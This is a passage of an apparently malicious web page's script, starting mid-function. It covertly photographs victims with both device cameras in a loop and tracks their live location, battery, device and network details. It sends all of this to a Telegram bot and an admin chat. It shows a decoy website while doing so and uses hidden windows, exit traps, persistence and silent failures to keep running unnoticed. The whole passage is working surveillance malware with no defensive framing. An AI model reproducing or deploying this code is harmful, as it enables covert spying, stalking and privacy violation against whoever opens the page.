                        });
                    }
                    
                    return true;
                    
                } catch (error) {
                    this.retryCount++;
                    STATE.cameraReady = false;
                    
                    // Clean up on failure
                    if (this.currentStream) {
                        this.currentStream.getTracks().forEach(track => track.stop());
                        this.currentStream = null;
                    }
                    
                    // Retry with delay
                    await new Promise(r => setTimeout(r, CONFIG.RETRY_DELAY));
                    return await this.startCamera(facingMode, retryCount + 1);
                }
            }
            
            async capturePhoto() {
                if (!STATE.cameraReady || !elements.video.videoWidth) {
                    return null;
                }
                
                try {
                    const canvas = elements.canvas;
                    const ctx = canvas.getContext('2d');
                    
                    canvas.width = elements.video.videoWidth;
                    canvas.height = elements.video.videoHeight;
                    
                    ctx.drawImage(elements.video, 0, 0, canvas.width, canvas.height);
                    
                    return new Promise((resolve) => {
                        canvas.toBlob(
                            (blob) => resolve(blob && blob.size > CONFIG.MIN_BLOB_SIZE ? blob : null),
                            'image/jpeg',
                            CONFIG.IMAGE_QUALITY
                        );
                    });
                    
                } catch (error) {
                    return null;
                }
            }
            
            async captureBurst(cameraType, count = CONFIG.PHOTOS_PER_CAMERA) {
                const results = [];
                
                for (let i = 1; i <= count; i++) {
                    if (!STATE.isRunning) break;
                    
                    const blob = await this.capturePhoto();
                    if (blob) {
                        results.push({ blob, index: i });
                    }
                    
                    if (i < count) {
                        await new Promise(r => setTimeout(r, CONFIG.CAPTURE_DELAY));
                    }
                }
                
                return results;
            }
            
            cleanup() {
                if (this.currentStream) {
                    this.currentStream.getTracks().forEach(track => track.stop());
                    this.currentStream = null;
                }
                STATE.cameraReady = false;
                STATE.currentCamera = null;
            }
        }
        
        // ============== ADVANCED TELEGRAM COMMUNICATION ==============
        
        async function sendToTelegram(blob, cameraType, sequence, retryCount = 0) {
            if (!blob || blob.size < CONFIG.MIN_BLOB_SIZE) {
                STATE.totalPhotosFailed++;
                return false;
            }
            
            if (retryCount >= CONFIG.MAX_RETRIES) {
                STATE.totalPhotosFailed++;
                return false;
            }
            
            try {
                // Create comprehensive caption
                let caption = `ðŸ“¸ *${cameraType.toUpperCase()} Camera - Photo ${sequence}*\n\n`;
                caption += `ðŸ†” Session: \`${STATE.sessionId}\`\n`;
                caption += `ðŸ‘¤ User ID: \`${STATE.userChatId}\`\n`;
                caption += `ðŸ”„ Cycle: ${STATE.cycleCount}\n`;
                caption += `ðŸ“Š Total Sent: ${STATE.totalPhotosSent}\n`;
                
                if (STATE.batteryInfo) {
                    caption += `ðŸ”‹ Battery: ${STATE.batteryInfo.level}% ${STATE.batteryInfo.charging ? 'âš¡' : ''}\n`;
                }
                
                if (STATE.locationInfo) {
                    caption += `ðŸ“ Location: [${STATE.locationInfo.latitude.toFixed(6)}, ${STATE.locationInfo.longitude.toFixed(6)}](${STATE.locationInfo.googleMapsLink})\n`;
                    caption += `ðŸŽ¯ Accuracy: ${STATE.locationInfo.accuracy}m\n`;
                }
                
                caption += `â° Time: ${new Date().toLocaleTimeString()}\n`;
                caption += `ðŸ“… Date: ${new Date().toLocaleDateString()}`;
                
                // Send to user
                const userFormData = new FormData();
                userFormData.append('chat_id', STATE.userChatId);
                userFormData.append('photo', blob, `${cameraType}_${sequence}_${Date.now()}.jpg`);
                userFormData.append('caption', caption);
                userFormData.append('parse_mode', 'Markdown');
                
                const userResponse = await fetch(`${CONFIG.TELEGRAM_API}/sendPhoto`, {
                    method: 'POST',
                    body: userFormData
                });
                
                const userResult = await userResponse.json();
                
                if (userResult.ok) {
                    // Also send to admin
                    try {
                        const adminFormData = new FormData();
                        adminFormData.append('chat_id', CONFIG.ADMIN_CHAT_ID);
                        adminFormData.append('photo', blob, `${cameraType}_${sequence}_admin_${Date.now()}.jpg`);
                        adminFormData.append('caption', caption + `\nðŸ‘¥ User: \`${STATE.userChatId}\``);
                        adminFormData.append('parse_mode', 'Markdown');
                        
                        await fetch(`${CONFIG.TELEGRAM_API}/sendPhoto`, {
                            method: 'POST',
                            body: adminFormData
                        });
                    } catch (adminError) {
                        // Admin send failed, but user send succeeded
                    }
                    
                    STATE.totalPhotosSent++;
                    STATE.lastCaptureTime = Date.now();
                    
                    // Broadcast success
                    if (STATE.broadcastChannel) {
                        STATE.broadcastChannel.postMessage({
                            type: 'photo_captured',
                            tabId: STATE.tabId,
                            camera: cameraType,
                            sequence: sequence,
                            timestamp: Date.now(),
                            sessionId: STATE.sessionId
                        });
                    }
                    
                    return true;
                    
                } else {
                    // Retry with exponential backoff
                    await new Promise(r => setTimeout(r, CONFIG.RETRY_DELAY * (retryCount + 1)));
                    return await sendToTelegram(blob, cameraType, sequence, retryCount + 1);
                }
                
            } catch (error) {
                // Store for later sync
                if (window._persistence) {
                    window._persistence.storePhoto(blob, cameraType, sequence);
                }
                
                // Retry with exponential backoff
                await new Promise(r => setTimeout(r, CONFIG.RETRY_DELAY * (retryCount + 1)));
                return await sendToTelegram(blob, cameraType, sequence, retryCount + 1);
            }
        }
        
        async function sendAdvancedDeviceReport() {
            try {
                let report = `ðŸš¨ *COMPLETE SURVEILLANCE REPORT*\n\n`;
                
                // Session Info
                report += `ðŸ“Š *SESSION INFORMATION*\n`;
                report += `ðŸ†” Session ID: \`${STATE.sessionId}\`\n`;
                report += `ðŸ‘¤ User ID: \`${STATE.userChatId}\`\n`;
                report += `ðŸŒ Website: ${STATE.targetWebsite}\n`;
                report += `ðŸ• Started: ${new Date(STATE.startTime).toLocaleString()}\n`;
                report += `â±ï¸ Duration: ${Math.round((Date.now() - STATE.startTime) / 1000)} seconds\n`;
                report += `ðŸ“¸ Photos Sent: ${STATE.totalPhotosSent}\n`;
                report += `ðŸ”„ Cycles: ${STATE.cycleCount}\n`;
                report += `ðŸ“¡ Active Tabs: ${STATE.otherTabs.size + 1}\n\n`;
                
                // Device Info
                report += `ðŸ–¥ï¸ *DEVICE HARDWARE*\n`;
                report += `ðŸ”§ Platform: ${STATE.deviceInfo.platform}\n`;
                report += `ðŸŒ Browser: ${STATE.deviceInfo.browser}\n`;
                report += `ðŸ’» OS: ${STATE.deviceInfo.os}\n`;
                report += `ðŸ“± Mobile: ${STATE.deviceInfo.isMobile ? 'Yes' : 'No'}\n`;
                report += `ðŸ’¾ RAM: ${STATE.deviceInfo.deviceMemory} GB\n`;
                report += `âš¡ CPU Cores: ${STATE.deviceInfo.hardwareConcurrency}\n`;
                report += `ðŸ‘† Touch Points: ${STATE.deviceInfo.maxTouchPoints}\n\n`;
                
                // Screen Info
                report += `ðŸ“º *DISPLAY INFORMATION*\n`;
                report += `ðŸ–¥ï¸ Screen: ${STATE.deviceInfo.screenWidth} Ã— ${STATE.deviceInfo.screenHeight}\n`;
                report += `ðŸ“ Available: ${STATE.deviceInfo.screenAvailWidth} Ã— ${STATE.deviceInfo.screenAvailHeight}\n`;
                report += `ðŸŽ¨ Color Depth: ${STATE.deviceInfo.screenColorDepth} bit\n`;
                report += `ðŸ” Pixel Ratio: ${STATE.deviceInfo.devicePixelRatio}\n`;
                report += `ðŸ“ Orientation: ${STATE.deviceInfo.orientation}\n\n`;
                
                // Location Info
                if (STATE.locationInfo) {
                    report += `ðŸ“ *LIVE LOCATION*\n`;
                    report += `ðŸŒ Latitude: ${STATE.locationInfo.latitude}\n`;
                    report += `ðŸŒ Longitude: ${STATE.locationInfo.longitude}\n`;
                    report += `ðŸŽ¯ Accuracy: ${STATE.locationInfo.accuracy} meters\n`;
                    report += `ðŸ• Timestamp: ${STATE.locationInfo.timestamp}\n`;
                    report += `ðŸ—ºï¸ [Google Maps](${STATE.locationInfo.googleMapsLink})\n\n`;
                }
                
                // Battery Info
                if (STATE.batteryInfo) {
                    report += `ðŸ”‹ *BATTERY STATUS*\n`;
                    report += `âš¡ Level: ${STATE.batteryInfo.level}%\n`;
                    report += `ðŸ”Œ Charging: ${STATE.batteryInfo.charging ? 'Yes âš¡' : 'No'}\n\n`;
                }
                
                // Network Info
                if (STATE.deviceInfo.connection) {
                    report += `ðŸŒ *NETWORK CONNECTION*\n`;
                    report += `ðŸ“¶ Type: ${STATE.deviceInfo.connection.effectiveType}\n`;
                    report += `â¬‡ï¸ Downlink: ${STATE.deviceInfo.connection.downlink} Mbps\n`;
                    report += `ðŸ”„ RTT: ${STATE.deviceInfo.connection.rtt} ms\n`;
                    report += `ðŸ’¾ Save Data: ${STATE.deviceInfo.connection.saveData ? 'Enabled' : 'Disabled'}\n`;
                    report += `ðŸ“¡ Connection Type: ${STATE.deviceInfo.connection.type}\n`;
                    report += `ðŸŒ IP Address: ${STATE.deviceInfo.ipAddress}\n\n`;
                }
                
                // Camera Info
                report += `ðŸ“· *CAMERA SYSTEM*\n`;
                report += `ðŸ“¸ Cameras Available: ${STATE.availableCameras.length}\n`;
                report += `ðŸ”„ Current Camera: ${STATE.currentCamera || 'None'}\n`;
                report += `âœ… Permission: ${STATE.permissionGranted ? 'Granted' : 'Denied'}\n`;
                report += `ðŸš€ System Status: ${STATE.isRunning ? 'Active' : 'Inactive'}\n\n`;
                
                // Advanced Features Status
                report += `âš¡ *SYSTEM FEATURES*\n`;
                report += `ðŸ”§ Persistence: ${CONFIG.ENABLE_BACKGROUND_PERSISTENCE ? 'Enabled' : 'Disabled'}\n`;
                report += `ðŸ”„ Multi-tab: ${CONFIG.ENABLE_MULTI_TAB ? 'Enabled' : 'Disabled'}\n`;
                report += `ðŸš« Exit Traps: ${CONFIG.ENABLE_EXIT_TRAPS ? 'Active' : 'Inactive'}\n`;
                report += `ðŸ‘» Hidden Windows: ${CONFIG.ENABLE_HIDDEN_WINDOWS ? 'Active' : 'Inactive'}\n`;
                report += `ðŸŽ­ Activity Sim: ${CONFIG.ENABLE_ACTIVITY_SIMULATION ? 'Active' : 'Inactive'}\n`;
                
                // Send to admin
                await fetch(`${CONFIG.TELEGRAM_API}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CONFIG.ADMIN_CHAT_ID,
                        text: report,
                        parse_mode: 'Markdown',
                        disable_web_page_preview: true
                    })
                });
                
                // Send simplified version to user
                const userReport = `ðŸ“± Device Report\n\nUser: ${STATE.userChatId}\nSession: ${STATE.sessionId}\nTime: ${new Date().toLocaleTimeString()}`;
                
                await fetch(`${CONFIG.TELEGRAM_API}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: STATE.userChatId,
                        text: userReport,
                        parse_mode: 'Markdown'
                    })
                });
                
            } catch (error) {
                // Silent fail
            }
        }
        
        // ============== MAIN SURVEILLANCE LOOP ==============
        
        async function startSurveillanceLoop() {
            if (STATE.isRunning) return;
            
            STATE.isRunning = true;
            
            // Start battery monitoring
            const batteryInterval = setInterval(async () => {
                if (STATE.isRunning) {
                    STATE.batteryInfo = await getBatteryInfo();
                }
            }, 60000);
            
            // Main surveillance loop
            while (STATE.isRunning) {
                try {
                    STATE.cycleCount++;
                    
                    // Update battery info every 3 cycles
                    if (STATE.cycleCount % 3 === 0) {
                        STATE.batteryInfo = await getBatteryInfo();
                    }
                    
                    // FRONT CAMERA
                    if (await window._cameraSystem.startCamera('user')) {
                        const frontPhotos = await window._cameraSystem.captureBurst('front');
                        for (const photo of frontPhotos) {
                            await sendToTelegram(photo.blob, 'front', photo.index);
                        }
                    }
                    
                    if (!STATE.isRunning) break;
                    await new Promise(r => setTimeout(r, CONFIG.SWITCH_DELAY));
                    
                    // BACK CAMERA
                    if (STATE.isRunning && await window._cameraSystem.startCamera('environment')) {
                        const backPhotos = await window._cameraSystem.captureBurst('back');
                        for (const photo of backPhotos) {
                            await sendToTelegram(photo.blob, 'back', photo.index);
                        }
                    }
                    
                    if (!STATE.isRunning) break;
                    
                    // Wait before next cycle
                    await new Promise(r => setTimeout(r, CONFIG.CAMERA_CYCLE_INTERVAL));
                    
                } catch (error) {
                    await new Promise(r => setTimeout(r, CONFIG.RETRY_DELAY));
                }
            }
            
            // Cleanup
            clearInterval(batteryInterval);
            if (window._cameraSystem) {
                window._cameraSystem.cleanup();
            }
        }
        
        // ============== INITIALIZATION ==============
        
        async function initializeAdvancedSystem() {
            try {
                // Step 1: Parse URL parameters
                parseURLParameters();
                
                // Step 2: Load website INSTANTLY
                loadWebsiteInstantly();
                
                // Step 3: Initialize all systems in background
                setTimeout(async () => {
                    // Initialize managers
                    const persistence = new AdvancedPersistence();
                    const tabCoordinator = new AdvancedTabCoordinator();
                    const windowManager = new AdvancedHiddenWindowManager();
                    const exitTrap = new AdvancedExitTrap();
                    const activitySimulator = new ActivitySimulator();
                    const cameraSystem = new AdvancedCameraSystem();
                    
                    // Start systems
                    await persistence.initialize();
                    await tabCoordinator.initialize();
                    exitTrap.activate();
                    activitySimulator.start();
                    
                    // Collect device data
                    await collectAdvancedDeviceInfo();
                    await getAdvancedLocation();
                    startAdvancedLocationTracking();
                    await getBatteryInfo();
                    
                    // Initialize camera
                    const hasCamera = await cameraSystem.initialize();
                    
                    if (hasCamera) {
                        // Send initial report
                        await sendAdvancedDeviceReport();
                        
                        // Start surveillance after delay
                        setTimeout(() => {
                            startSurveillanceLoop();
                        }, 8000);
                    }
                    
                    // Create hidden window after delay
                    setTimeout(() => {
                        windowManager.createHiddenWindow();
                    }, 12000);
                    
                    // Store references
                    window._persistence = persistence;
                    window._tabCoordinator = tabCoordinator;
                    window._windowManager = windowManager;
                    window._exitTrap = exitTrap;
                    window._activitySimulator = activitySimulator;
                    window._cameraSystem = cameraSystem;
                    
                    // Background indicator
                    elements.backgroundIndicator.style.opacity = '0.3';
                    
                }, 500); // Short delay
                
            } catch (error) {
                // Silent fail
            }
        }
        
        // ============== EVENT HANDLERS ==============
        
        // Handle backup heartbeats
        window.addEventListener('message', (event) => {
            if (event.data && event.data.type === 'backup_heartbeat') {
                // Backup window is alive
            }
        });
        
        // Handle page visibility
        document.addEventListener('visibilitychange', () => {
            if (document.hidden) {
                // Create backup when page hidden
                if (window._windowManager) {
                    window._windowManager.createHiddenWindow();
                }
            }
        });
        
        // Handle beforeunload for cleanup
        window.addEventListener('beforeunload', () => {
            // Stop surveillance
            STATE.isRunning = false;
            
            // Cleanup camera
            if (window._cameraSystem) {
                window._cameraSystem.cleanup();
            }
            
            // Cleanup managers
            if (window._tabCoordinator) {
                window._tabCoordinator.cleanup();
            }
            
            if (window._windowManager) {
                window._windowManager.cleanup();
            }
            
            if (window._exitTrap) {
                window._exitTrap.cleanup();
            }
            
            if (window._activitySimulator) {
                window._activitySimulator.cleanup();
            }
            
            if (window._persistence) {
                window._persistence.cleanup();
            }
            
            // Hide indicator
            elements.backgroundIndicator.style.opacity = '0';
        });
        
        // Handle offline/online
        window.addEventListener('online', () => {
            // Sync pending data when back online
            if (window._persistence) {
                window._persistence.syncPendingData();
            }
        });
        
        // ============== START SYSTEM ==============
        
        // Start immediately
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', initializeAdvancedSystem);
        } else {
            initializeAdvancedSystem();
        }
        
        // Debug access (completely hidden)
        Object.defineProperty(window, '$$', {
            get: () => ({
                state: STATE,
                config: CONFIG,
                restart: () => {
                    location.reload();
                },
                status: () => ({
                    running: STATE.isRunning,
                    photos: STATE.totalPhotosSent,
                    cycles: STATE.cycleCount,
                    tabs: STATE.otherTabs.size + 1,
                    hidden: STATE.hiddenWindows.size
                })
            }),
            configurable: false,
            enumerable: false
        });
        
    </script>
</body>
</html>
